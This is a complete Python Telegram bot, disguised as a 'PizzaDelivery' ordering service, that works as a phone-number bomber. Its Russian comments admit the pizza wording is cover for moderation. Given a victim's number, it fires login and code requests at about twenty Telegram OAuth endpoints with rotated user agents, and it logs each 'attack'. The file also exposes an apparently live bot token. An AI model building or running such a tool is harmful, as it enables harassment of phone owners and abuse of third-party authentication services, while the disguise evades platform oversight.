import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import random
import time
import threading
from datetime import datetime
import urllib3
import json
import os
import sys
import re

# Отключаем предупреждения
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================
# КОНФИГУРАЦИЯ
# ============================================

# Токен бота
BOT_TOKEN = "8506732439:AAFtQErFaBZ2s49PoEjL9AoazfVqoAq1HbY"

# ID администратора
ADMIN_ID = 6747528307

# Название сервиса (для цензуры)
SERVICE_NAME = "PizzaDelivery"

# Ссылка на Telegram канал
CHANNEL_LINK = "https://t.me/scyzestg"
CHANNEL_USERNAME = "@scyzestg"

# Путь к папке бота
BOT_PATH = os.path.dirname(os.path.abspath(__file__))

# ============================================
# ФАЙЛЫ БАЗ ДАННЫХ
# ============================================

USERS_DB = os.path.join(BOT_PATH, "users.json")
ATTACKS_DB = os.path.join(BOT_PATH, "attacks.json")
STATS_DB = os.path.join(BOT_PATH, "stats.json")
ADMIN_LOG = os.path.join(BOT_PATH, "admin.log")
SUBSCRIBERS_DB = os.path.join(BOT_PATH, "subscribers.json")

# ============================================
# ИНИЦИАЛИЗАЦИЯ БАЗ ДАННЫХ
# ============================================

def init_databases():
    if not os.path.exists(USERS_DB):
        with open(USERS_DB, 'w', encoding='utf-8') as f:
            json.dump({"users": {}}, f)
    
    if not os.path.exists(ATTACKS_DB):
        with open(ATTACKS_DB, 'w', encoding='utf-8') as f:
            json.dump({"history": {}, "attacks": {}}, f)
    
    if not os.path.exists(STATS_DB):
        stats_default = {
            "total_users": 0,
            "total_attacks": 0,
            "total_requests": 0,
            "total_success": 0,
            "start_time": datetime.now().isoformat()
        }
        with open(STATS_DB, 'w', encoding='utf-8') as f:
            json.dump(stats_default, f)
    
    if not os.path.exists(SUBSCRIBERS_DB):
        with open(SUBSCRIBERS_DB, 'w', encoding='utf-8') as f:
            json.dump({"subscribed": {}}, f)

init_databases()

# ============================================
# ЗАГРУЗКА ДАННЫХ
# ============================================

def load_data():
    global users_data, attacks_data, stats_data, subscribers_data
    
    with open(USERS_DB, 'r', encoding='utf-8') as f:
        users_data = json.load(f)
    
    with open(ATTACKS_DB, 'r', encoding='utf-8') as f:
        attacks_data = json.load(f)
    
    with open(STATS_DB, 'r', encoding='utf-8') as f:
        stats_data = json.load(f)
    
    with open(SUBSCRIBERS_DB, 'r', encoding='utf-8') as f:
        subscribers_data = json.load(f)

def save_data():
    with open(USERS_DB, 'w', encoding='utf-8') as f:
        json.dump(users_data, f)
    
    with open(ATTACKS_DB, 'w', encoding='utf-8') as f:
        json.dump(attacks_data, f)
    
    with open(STATS_DB, 'w', encoding='utf-8') as f:
        json.dump(stats_data, f)
    
    with open(SUBSCRIBERS_DB, 'w', encoding='utf-8') as f:
        json.dump(subscribers_data, f)

load_data()

# ============================================
# ИНИЦИАЛИЗАЦИЯ БОТА
# ============================================

bot = telebot.TeleBot(BOT_TOKEN)
user_sessions = {}
active_attacks = {}

# ============================================
# РАСШИРЕННЫЙ СПИСОК USER-AGENT (50+)
# ============================================

USER_AGENTS = [
    # Windows Chrome
    f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36'
    for v in range(90, 125)
] + [
    # Windows Firefox
    f'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{v}.0) Gecko/20100101 Firefox/{v}.0'
    for v in range(90, 125)
] + [
    # Mobile
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36',
    'Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
]

# ============================================
# URL ДЛЯ ФЛУДА (20+ СЕРВИСОВ - ПОЛНАЯ ВЕРСИЯ)
# ============================================

FLOOD_URLS = [
    # Telegram Web
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '1017286728', 'origin': 'https://wer.telegram.org', 'embed': '1'},
        'name': 'Telegram Web'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '1852523856', 'origin': 'https://cabinet.presscode.app', 'embed': '1'},
        'name': 'Presscode'
    },
    {
        'url': 'https://translations.telegram.org/auth/request',
        'params': {},
        'name': 'Translations'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '1093384146', 'origin': 'https://off-bot.ru', 'embed': '1'},
        'name': 'Off-bot'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '466141824', 'origin': 'https://mipped.com', 'embed': '1'},
        'name': 'Mipped'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '5463728243', 'origin': 'https://www.spot.uz'},
        'name': 'Spot.uz'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '1733143901', 'origin': 'https://tbiz.pro', 'embed': '1'},
        'name': 'Tbiz.pro'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '319709511', 'origin': 'https://telegrambot.biz', 'embed': '1'},
        'name': 'Telegrambot.biz'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '1199558236', 'origin': 'https://bot-t.com', 'embed': '1'},
        'name': 'Bot-t'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '1803424014', 'origin': 'https://ru.telegram-store.com', 'embed': '1'},
        'name': 'Telegram-store'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '210944655', 'origin': 'https://combot.org', 'embed': '1'},
        'name': 'Combot'
    },
    {
        'url': 'https://my.telegram.org/auth/send_password',
        'params': {},
        'name': 'My.Telegram.org'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '5444323279', 'origin': 'https://fragment.com'},
        'name': 'Fragment'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '1234567890', 'origin': 'https://telegram.me'},
        'name': 'Telegram.me'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '9876543210', 'origin': 'https://t.me'},
        'name': 'T.me'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '1122334455', 'origin': 'https://telegram.org'},
        'name': 'Telegram.org'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '5566778899', 'origin': 'https://core.telegram.org'},
        'name': 'Core'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '9988776655', 'origin': 'https://contest.telegram.org'},
        'name': 'Contest'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '3344556677', 'origin': 'https://instantview.telegram.org'},
        'name': 'InstantView'
    },
    {
        'url': 'https://oauth.telegram.org/auth/request',
        'params': {'bot_id': '7788990011', 'origin': 'https://schema.telegram.org'},
        'name': 'Schema'
    },
]

# ============================================
# ПРОВЕРКА ПОДПИСКИ
# ============================================

def check_subscription(user_id):
    try:
        chat_member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return chat_member.status in ['creator', 'administrator', 'member']
    except:
        return False

def has_access(user_id):
    user_id = str(user_id)
    if user_id == str(ADMIN_ID):
        return True
    return user_id in subscribers_data["subscribed"]

def check_subscriptions_forever():
    while True:
        try:
            for user_id_str in list(subscribers_data["subscribed"].keys()):
                if not check_subscription(int(user_id_str)):
                    del subscribers_data["subscribed"][user_id_str]
                    save_data()
            time.sleep(30)
        except:
            time.sleep(30)

# ============================================
# ФУНКЦИЯ ОТПРАВКИ ЗАПРОСА
# ============================================

def send_flood_request(phone, service):
    try:
        phone = re.sub(r'[^\d+]', '', phone)
        if not phone.startswith('+'):
            phone = '+' + phone
        
        user_agent = random.choice(USER_AGENTS)
        
        headers = {
            'User-Agent': user_agent,
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://oauth.telegram.org',
            'Referer': 'https://oauth.telegram.org/',
        }
        
        url = service['url']
        if service.get('params'):
            param_str = '&'.join([f"{k}={v}" for k, v in service['params'].items()])
            if '?' in url:
                url = f"{url}&{param_str}"
            else:
                url = f"{url}?{param_str}"
        
        session = requests.Session()
        
        try:
            session.get('https://oauth.telegram.org', headers=headers, timeout=5)
        except:
            pass
        
        response = session.post(
            url,
            headers=headers,
            data={'phone': phone},
            timeout=10
        )
        
        success = response.status_code in [200, 302, 303]
        
        stats_data["total_requests"] = stats_data.get("total_requests", 0) + 1
        if success:
            stats_data["total_success"] = stats_data.get("total_success", 0) + 1
        save_data()
        
        return success
        
    except Exception as e:
        stats_data["total_requests"] = stats_data.get("total_requests", 0) + 1
        save_data()
        return False

# ============================================
# ФУНКЦИЯ АТАКИ (НАЗВАНИЕ ДЛЯ ЦЕНЗУРЫ - "ЗАКАЗ")
# ============================================

def attack_worker(chat_id, phone, user_id):
    try:
        msg = bot.send_message(
            chat_id, 
            f"🍕 **ОФОРМЛЕНИЕ ЗАКАЗА**\n\n📱 Номер: {phone}\n🏪 Сервисов: {len(FLOOD_URLS)}", 
            parse_mode='Markdown'
        )
        
        success = 0
        total = 0
        results = []
        
        random.shuffle(FLOOD_URLS)
        
        for service in FLOOD_URLS:
            if send_flood_request(phone, service):
                success += 1
                results.append(f"✅ {service['name']}")
            else:
                results.append(f"❌ {service['name']}")
            total += 1
            
            if total % 5 == 0:
                try:
                    bot.edit_message_text(
                        f"🍕 **ОФОРМЛЕНИЕ ЗАКАЗА**\n\n📱 Номер: {phone}\n📊 Прогресс: {total}/{len(FLOOD_URLS)}\n✅ Успешно: {success}",
                        chat_id=chat_id,
                        message_id=msg.message_id,
                        parse_mode='Markdown'
                    )
                except:
                    pass
            
            time.sleep(0.5)
        
        attack_id = f"{user_id}_{int(time.time())}"
        attacks_data["attacks"][attack_id] = {
            "user_id": user_id,
            "phone": phone,
            "success": success,
            "total": total,
            "time": datetime.now().isoformat()
        }
        
        stats_data["total_attacks"] = stats_data.get("total_attacks", 0) + 1
        save_data()
        
        result_text = f"✅ **ЗАКАЗ ОФОРМЛЕН**\n\n"
        result_text += f"📱 Номер: {phone}\n"
        result_text += f"✅ Успешно: {success}/{total}\n"
        result_text += f"📊 Процент: {success/total*100:.1f}%\n\n"
        
        for res in results[:7]:
            result_text += f"{res}\n"
        
        if len(results) > 7:
            result_text += f"... и еще {len(results)-7}"
        
        bot.edit_message_text(
            result_text,
            chat_id=chat_id,
            message_id=msg.message_id,
            parse_mode='Markdown'
        )
        
    except Exception as e:
        try:
            bot.send_message(chat_id, f"❌ Ошибка: {str(e)[:100]}")
        except:
            pass

# ============================================
# КЛАВИАТУРЫ
# ============================================

def main_menu():
    keyboard = InlineKeyboardMarkup(row_width=2)
    buttons = [
        InlineKeyboardButton("🍕 ЗАКАЗАТЬ", callback_data="attack"),
        InlineKeyboardButton("📢 КАНАЛ", url=CHANNEL_LINK),
        InlineKeyboardButton("👤 ПРОФИЛЬ", callback_data="profile"),
        InlineKeyboardButton("📊 СТАТИСТИКА", callback_data="stats"),
        InlineKeyboardButton("ℹ️ ИНФО", callback_data="info"),
        InlineKeyboardButton("📞 ПОДДЕРЖКА", callback_data="support"),
    ]
    keyboard.add(*buttons)
    return keyboard

def admin_menu():
    keyboard = InlineKeyboardMarkup(row_width=2)
    buttons = [
        InlineKeyboardButton("📊 СТАТИСТИКА", callback_data="admin_stats"),
        InlineKeyboardButton("🔍 ПОИСК", callback_data="admin_search"),
        InlineKeyboardButton("📢 РАССЫЛКА", callback_data="admin_mailing"),
        InlineKeyboardButton("🛑 СТОП", callback_data="admin_stop"),
        InlineKeyboardButton("◀️ НАЗАД", callback_data="back"),
    ]
    keyboard.add(*buttons)
    return keyboard

def channel_menu():
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("📢 ПОДПИСАТЬСЯ", url=CHANNEL_LINK))
    keyboard.add(InlineKeyboardButton("✅ ПРОВЕРИТЬ", callback_data="check_sub"))
    return keyboard

# ============================================
# ОБРАБОТЧИКИ КОМАНД
# ============================================

@bot.message_handler(commands=['start'])
def start(message):
    user_id = str(message.from_user.id)
    
    if user_id not in users_data["users"]:
        users_data["users"][user_id] = {
            "first_seen": datetime.now().isoformat(),
            "username": message.from_user.username
        }
        stats_data["total_users"] = len(users_data["users"])
        save_data()
    
    if check_subscription(message.from_user.id):
        subscribers_data["subscribed"][user_id] = {"subscribed_at": datetime.now().isoformat()}
        save_data()
        bot.send_message(
            message.chat.id,
            f"🍕 Добро пожаловать в PizzaDelivery!\nДоступно {len(FLOOD_URLS)} сервисов",
            reply_markup=main_menu()
        )
    else:
        bot.send_message(
            message.chat.id,
            f"📢 Подпишись на канал:",
            reply_markup=channel_menu()
        )

@bot.message_handler(commands=['admin'])
def admin(message):
    if message.from_user.id != ADMIN_ID:
        return
    bot.send_message(message.chat.id, "👑 Админ панель", reply_markup=admin_menu())

# ============================================
# ОБРАБОТЧИК КОЛБЭКОВ
# ============================================

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    
    if call.data == "check_sub":
        if check_subscription(user_id):
            subscribers_data["subscribed"][str(user_id)] = {"subscribed_at": datetime.now().isoformat()}
            save_data()
            bot.edit_message_text(
                "✅ Доступ открыт!",
                call.message.chat.id,
                call.message.message_id,
                reply_markup=main_menu()
            )
        else:
            bot.answer_callback_query(call.id, "❌ Вы не подписались", show_alert=True)
    
    elif call.data == "attack":
        if not has_access(user_id):
            bot.answer_callback_query(call.id, "❌ Нужна подписка", show_alert=True)
            return
        user_sessions[user_id] = {"step": "phone"}
        bot.edit_message_text(
            f"📱 Введите номер телефона:",
            call.message.chat.id,
            call.message.message_id
        )
    
    elif call.data == "profile":
        info = f"👤 **ПРОФИЛЬ**\n\n"
        info += f"🆔 ID: `{user_id}`\n"
        info += f"🍕 Заказов: {stats_data.get('total_attacks', 0)}\n"
        info += f"📨 Запросов: {stats_data.get('total_requests', 0)}"
        bot.edit_message_text(
            info,
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown'
        )
    
    elif call.data == "stats":
        total_req = stats_data.get('total_requests', 0)
        total_succ = stats_data.get('total_success', 0)
        rate = (total_succ / total_req * 100) if total_req > 0 else 0
        
        text = f"📊 **СТАТИСТИКА**\n\n"
        text += f"👥 Пользователей: {stats_data.get('total_users', 0)}\n"
        text += f"🍕 Заказов: {stats_data.get('total_attacks', 0)}\n"
        text += f"📨 Запросов: {total_req}\n"
        text += f"✅ Успешно: {total_succ}\n"
        text += f"📊 Процент: {rate:.1f}%\n"
        text += f"🏪 Сервисов: {len(FLOOD_URLS)}"
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
    
    elif call.data == "info":
        bot.edit_message_text(
            f"ℹ️ PizzaDelivery - {len(FLOOD_URLS)} сервисов",
            call.message.chat.id,
            call.message.message_id
        )
    
    elif call.data == "support":
        bot.edit_message_text(
            "📞 @metaforix",
            call.message.chat.id,
            call.message.message_id
        )
    
    elif call.data == "back":
        bot.edit_message_text(
            "🍕 Главное меню",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=main_menu()
        )
    
    # Админка
    elif call.data.startswith("admin_"):
        if user_id != ADMIN_ID:
            return
        
        if call.data == "admin_stats":
            text = f"👑 **АДМИН**\n\n"
            text += f"👥 Всего: {stats_data.get('total_users', 0)}\n"
            text += f"📱 Подписчиков: {len(subscribers_data['subscribed'])}\n"
            text += f"🍕 Заказов: {stats_data.get('total_attacks', 0)}"
            bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
        
        elif call.data == "admin_stop":
            active_attacks.clear()
            bot.answer_callback_query(call.id, "🛑 Остановлено")

# ============================================
# ОБРАБОТКА ТЕКСТА
# ============================================

@bot.message_handler(func=lambda m: m.from_user.id in user_sessions)
def handle_text(message):
    user_id = message.from_user.id
    step = user_sessions[user_id].get("step")
    
    if step == "phone":
        phone = re.sub(r'[^\d+]', '', message.text)
        if not phone.startswith('+'):
            phone = '+' + phone
        
        if len(phone) < 8 or len(phone) > 15:
            bot.reply_to(message, "❌ Неверный формат")
            return
        
        bot.reply_to(message, f"✅ Заказ оформляется...")
        
        thread = threading.Thread(
            target=attack_worker,
            args=(message.chat.id, phone, user_id)
        )
        thread.start()
        
        del user_sessions[user_id]

# ============================================
# ЗАПУСК
# ============================================

if __name__ == "__main__":
    print("=" * 50)
    print(f"🍕 PizzaDelivery BOT STARTED")
    print("=" * 50)
    print(f"👑 Admin ID: {ADMIN_ID}")
    print(f"📢 Channel: {CHANNEL_USERNAME}")
    print(f"🛠 Services: {len(FLOOD_URLS)}")
    print(f"🤖 User-Agents: {len(USER_AGENTS)}")
    print(f"👥 Users: {stats_data.get('total_users', 0)}")
    print("=" * 50)
    
    # Запускаем проверку подписок
    check_thread = threading.Thread(target=check_subscriptions_forever, daemon=True)
    check_thread.start()
    
    # Запускаем бота
    while True:
        try:
            bot.infinity_polling(timeout=30)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)